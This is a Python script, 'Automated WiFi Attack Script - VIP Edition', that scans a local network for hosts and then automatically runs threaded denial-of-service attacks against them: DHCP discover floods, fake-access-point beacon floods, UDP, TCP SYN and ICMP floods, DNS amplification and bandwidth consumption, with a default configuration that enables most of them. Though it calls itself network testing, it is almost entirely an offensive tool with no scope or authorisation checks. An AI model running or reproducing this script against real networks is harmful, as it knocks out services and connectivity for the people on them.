#!/usr/bin/env python3
"""
Automated WiFi Attack Script - VIP Edition
==========================================

Fully automated attack sequences for comprehensive network testing
"""

import os
import sys
import time
import json
import threading
import argparse
from datetime import datetime
from wifi_advanced_tester import AdvancedWiFiTester

class AutomatedAttacker:
    def __init__(self):
        self.tester = AdvancedWiFiTester()
        self.config = {}
        self.results = {}
        self.log_file = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
    def load_config(self, config_file):
        """Load attack configuration from file"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
            print(f"[+] Loaded configuration from {config_file}")
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            sys.exit(1)
    
    def log_result(self, attack_type, status, details):
        """Log attack results"""
        timestamp = datetime.now().isoformat()
        
        if attack_type not in self.results:
            self.results[attack_type] = []
        
        self.results[attack_type].append({
            'timestamp': timestamp,
            'status': status,
            'details': details
        })
        
        # Save to file
        with open(self.log_file, 'w') as f:
            json.dump(self.results, f, indent=2)
    
    def automated_recon(self, interface):
        """Automated reconnaissance phase"""
        print("\n[🔍 PHASE 1: AUTOMATED RECONNAISSANCE]")
        print("=" * 60)
        
        # Get network info
        print("[*] Gathering network information...")
        self.tester.get_network_info(interface)
        
        # Scan for targets
        if self.tester.network_range:
            print(f"[*] Scanning network: {self.tester.network_range}")
            targets = self.tester.scan_targets(self.tester.network_range)
            
            self.log_result('reconnaissance', 'success', {
                'network_range': self.tester.network_range,
                'targets_found': len(targets),
                'targets': targets
            })
            
            return targets
        
        return []
    
    def automated_layer2_attacks(self, interface, targets):
        """Automated Layer 2 attacks"""
        print("\n[💥 PHASE 2: LAYER 2 ATTACKS]")
        print("=" * 60)
        
        attacks = []
        
        # DHCP Flood Attack
        if self.config.get('dhcp_flood', {}).get('enabled', False):
            print("[*] Starting DHCP Discover Flood...")
            
            def dhcp_attack():
                try:
                    self.tester.running = True
                    threads = self.config['dhcp_flood'].get('threads', 20)
                    count = self.config['dhcp_flood'].get('count', 1000)
                    
                    start_time = time.time()
                    self.tester.dhcp_discover_flood(interface, threads, count)
                    duration = time.time() - start_time
                    
                    self.log_result('dhcp_flood', 'completed', {
                        'threads': threads,
                        'packets_sent': self.tester.packet_count,
                        'duration': duration
                    })
                except Exception as e:
                    self.log_result('dhcp_flood', 'error', str(e))
            
            dhcp_thread = threading.Thread(target=dhcp_attack)
            dhcp_thread.start()
            attacks.append(dhcp_thread)
        
        # Advanced Beacon Flood
        if self.config.get('beacon_flood', {}).get('enabled', False):
            print("[*] Starting Advanced Beacon Flood...")
            
            def beacon_attack():
                try:
                    self.tester.running = True
                    threads = self.config['beacon_flood'].get('threads', 15)
                    count = self.config['beacon_flood'].get('count', 500)
                    
                    start_time = time.time()
                    self.tester.advanced_beacon_flood(interface, threads, count)
                    duration = time.time() - start_time
                    
                    self.log_result('beacon_flood', 'completed', {
                        'threads': threads,
                        'fake_aps_created': self.tester.packet_count,
                        'duration': duration
                    })
                except Exception as e:
                    self.log_result('beacon_flood', 'error', str(e))
            
            beacon_thread = threading.Thread(target=beacon_attack)
            beacon_thread.start()
            attacks.append(beacon_thread)
        
        return attacks
    
    def automated_layer3_attacks(self, targets):
        """Automated Layer 3/4 attacks"""
        print("\n[🌊 PHASE 3: LAYER 3/4 FLOOD ATTACKS]")
        print("=" * 60)
        
        attacks = []
        
        for target in targets[:3]:  # Limit to first 3 targets
            # UDP Flood
            if self.config.get('udp_flood', {}).get('enabled', False):
                print(f"[*] Starting UDP Flood on {target}...")
                
                def udp_attack(target_ip):
                    try:
                        self.tester.running = True
                        port = self.config['udp_flood'].get('port', 80)
                        threads = self.config['udp_flood'].get('threads', 30)
                        size = self.config['udp_flood'].get('size', 1024)
                        
                        start_time = time.time()
                        self.tester.udp_flood_attack(target_ip, port, threads, size)
                        duration = time.time() - start_time
                        
                        self.log_result('udp_flood', 'completed', {
                            'target': target_ip,
                            'port': port,
                            'threads': threads,
                            'packets_sent': self.tester.packet_count,
                            'duration': duration
                        })
                    except Exception as e:
                        self.log_result('udp_flood', 'error', str(e))
                
                udp_thread = threading.Thread(target=udp_attack, args=(target,))
                udp_thread.start()
                attacks.append(udp_thread)
            
            # TCP SYN Flood
            if self.config.get('syn_flood', {}).get('enabled', False):
                print(f"[*] Starting TCP SYN Flood on {target}...")
                
                def syn_attack(target_ip):
                    try:
                        self.tester.running = True
                        port = self.config['syn_flood'].get('port', 80)
                        threads = self.config['syn_flood'].get('threads', 25)
                        
                        start_time = time.time()
                        self.tester.tcp_syn_flood_attack(target_ip, port, threads)
                        duration = time.time() - start_time
                        
                        self.log_result('syn_flood', 'completed', {
                            'target': target_ip,
                            'port': port,
                            'threads': threads,
                            'packets_sent': self.tester.packet_count,
                            'duration': duration
                        })
                    except Exception as e:
                        self.log_result('syn_flood', 'error', str(e))
                
                syn_thread = threading.Thread(target=syn_attack, args=(target,))
                syn_thread.start()
                attacks.append(syn_thread)
            
            # ICMP Flood
            if self.config.get('icmp_flood', {}).get('enabled', False):
                print(f"[*] Starting ICMP Flood on {target}...")
                
                def icmp_attack(target_ip):
                    try:
                        self.tester.running = True
                        threads = self.config['icmp_flood'].get('threads', 20)
                        size = self.config['icmp_flood'].get('size', 1024)
                        
                        start_time = time.time()
                        self.tester.icmp_flood_attack(target_ip, threads, size)
                        duration = time.time() - start_time
                        
                        self.log_result('icmp_flood', 'completed', {
                            'target': target_ip,
                            'threads': threads,
                            'packets_sent': self.tester.packet_count,
                            'duration': duration
                        })
                    except Exception as e:
                        self.log_result('icmp_flood', 'error', str(e))
                
                icmp_thread = threading.Thread(target=icmp_attack, args=(target,))
                icmp_thread.start()
                attacks.append(icmp_thread)
        
        return attacks
    
    def automated_advanced_attacks(self, targets):
        """Automated advanced attacks"""
        print("\n[🎯 PHASE 4: ADVANCED ATTACKS]")
        print("=" * 60)
        
        attacks = []
        
        # DNS Amplification
        if self.config.get('dns_amplification', {}).get('enabled', False):
            for target in targets[:2]:  # Limit to 2 targets
                print(f"[*] Starting DNS Amplification on {target}...")
                
                def dns_attack(target_ip):
                    try:
                        self.tester.running = True
                        threads = self.config['dns_amplification'].get('threads', 15)
                        
                        start_time = time.time()
                        self.tester.dns_amplification_attack(target_ip, None, threads)
                        duration = time.time() - start_time
                        
                        self.log_result('dns_amplification', 'completed', {
                            'target': target_ip,
                            'threads': threads,
                            'packets_sent': self.tester.packet_count,
                            'duration': duration
                        })
                    except Exception as e:
                        self.log_result('dns_amplification', 'error', str(e))
                
                dns_thread = threading.Thread(target=dns_attack, args=(target,))
                dns_thread.start()
                attacks.append(dns_thread)
        
        # Bandwidth Consumption
        if self.config.get('bandwidth_attack', {}).get('enabled', False):
            for target in targets[:1]:  # Only one target for bandwidth attack
                print(f"[*] Starting Bandwidth Consumption on {target}...")
                
                def bandwidth_attack(target_ip):
                    try:
                        self.tester.running = True
                        threads = self.config['bandwidth_attack'].get('threads', 50)
                        
                        start_time = time.time()
                        self.tester.bandwidth_consumption_attack(target_ip, threads)
                        duration = time.time() - start_time
                        
                        self.log_result('bandwidth_attack', 'completed', {
                            'target': target_ip,
                            'threads': threads,
                            'packets_sent': self.tester.packet_count,
                            'duration': duration
                        })
                    except Exception as e:
                        self.log_result('bandwidth_attack', 'error', str(e))
                
                bandwidth_thread = threading.Thread(target=bandwidth_attack, args=(target,))
                bandwidth_thread.start()
                attacks.append(bandwidth_thread)
        
        return attacks
    
    def run_automated_sequence(self, interface):
        """Run complete automated attack sequence"""
        print("\n[🚀 STARTING AUTOMATED ATTACK SEQUENCE]")
        print("=" * 60)
        
        start_time = datetime.now()
        
        try:
            # Phase 1: Reconnaissance
            targets = self.automated_recon(interface)
            
            if not targets:
                print("[!] No targets found! Aborting...")
                return
            
            print(f"[+] Found {len(targets)} targets: {targets}")
            
            # Phase 2: Layer 2 Attacks
            layer2_attacks = self.automated_layer2_attacks(interface, targets)
            
            # Wait for Layer 2 attacks to establish
            time.sleep(5)
            
            # Phase 3: Layer 3/4 Attacks
            layer3_attacks = self.automated_layer3_attacks(targets)
            
            # Phase 4: Advanced Attacks
            advanced_attacks = self.automated_advanced_attacks(targets)
            
            # Run for specified duration
            duration = self.config.get('global', {}).get('duration', 60)
            print(f"\n[*] Running attacks for {duration} seconds...")
            
            for i in range(duration):
                print(f"\r[*] Attack progress: {i+1}/{duration} seconds", end='', flush=True)
                time.sleep(1)
            
            print(f"\n[*] Attack duration completed!")
            
        except KeyboardInterrupt:
            print("\n[*] Attack sequence interrupted by user")
        
        finally:
            # Stop all attacks
            print("[*] Stopping all attacks...")
            self.tester.running = False
            
            # Wait for threads to complete
            all_attacks = layer2_attacks + layer3_attacks + advanced_attacks
            for attack in all_attacks:
                if attack.is_alive():
                    attack.join(timeout=5)
            
            end_time = datetime.now()
            total_duration = (end_time - start_time).total_seconds()
            
            # Generate final report
            self.generate_report(total_duration)
    
    def generate_report(self, duration):
        """Generate attack report"""
        print("\n[📊 ATTACK REPORT]")
        print("=" * 60)
        
        total_attacks = len(self.results)
        successful_attacks = 0
        total_packets = 0
        
        for attack_type, results in self.results.items():
            print(f"\n[+] {attack_type.upper()}:")
            for result in results:
                if result['status'] == 'completed':
                    successful_attacks += 1
                    if 'packets_sent' in result['details']:
                        total_packets += result['details']['packets_sent']
                    print(f"  ✓ Status: {result['status']}")
                    print(f"  ✓ Details: {result['details']}")
                else:
                    print(f"  ✗ Status: {result['status']}")
                    print(f"  ✗ Error: {result['details']}")
        
        print(f"\n[📈 SUMMARY]")
        print(f"Total attack types: {total_attacks}")
        print(f"Successful attacks: {successful_attacks}")
        print(f"Total packets sent: {total_packets}")
        print(f"Total duration: {duration:.1f} seconds")
        print(f"Average PPS: {total_packets/duration:.2f}" if duration > 0 else "N/A")
        print(f"Log file: {self.log_file}")

def create_default_config():
    """Create default configuration file"""
    config = {
        "global": {
            "duration": 60,
            "interface": "wlan0"
        },
        "dhcp_flood": {
            "enabled": True,
            "threads": 20,
            "count": 1000
        },
        "beacon_flood": {
            "enabled": True,
            "threads": 15,
            "count": 500
        },
        "udp_flood": {
            "enabled": True,
            "port": 80,
            "threads": 30,
            "size": 1024
        },
        "syn_flood": {
            "enabled": True,
            "port": 80,
            "threads": 25
        },
        "icmp_flood": {
            "enabled": True,
            "threads": 20,
            "size": 1024
        },
        "dns_amplification": {
            "enabled": True,
            "threads": 15
        },
        "bandwidth_attack": {
            "enabled": False,
            "threads": 50
        }
    }
    
    with open('attack_config.json', 'w') as f:
        json.dump(config, f, indent=2)
    
    print("[+] Created default configuration: attack_config.json")

def main():
    parser = argparse.ArgumentParser(description='Automated WiFi Attack Script VIP')
    parser.add_argument('-c', '--config', default='attack_config.json', 
                       help='Configuration file (default: attack_config.json)')
    parser.add_argument('-i', '--interface', help='Network interface to use')
    parser.add_argument('--create-config', action='store_true', 
                       help='Create default configuration file')
    
    args = parser.parse_args()
    
    # Check root privileges
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges!")
        print("[!] Please run with sudo")
        sys.exit(1)
    
    if args.create_config:
        create_default_config()
        return
    
    attacker = AutomatedAttacker()
    
    # Load configuration
    if os.path.exists(args.config):
        attacker.load_config(args.config)
    else:
        print(f"[!] Configuration file {args.config} not found!")
        print("[*] Use --create-config to create a default configuration")
        sys.exit(1)
    
    # Get interface
    interface = args.interface or attacker.config.get('global', {}).get('interface')
    if not interface:
        print("[!] No interface specified!")
        sys.exit(1)
    
    try:
        attacker.run_automated_sequence(interface)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("\n[+] Automated attack sequence completed!")

if __name__ == "__main__":
    main()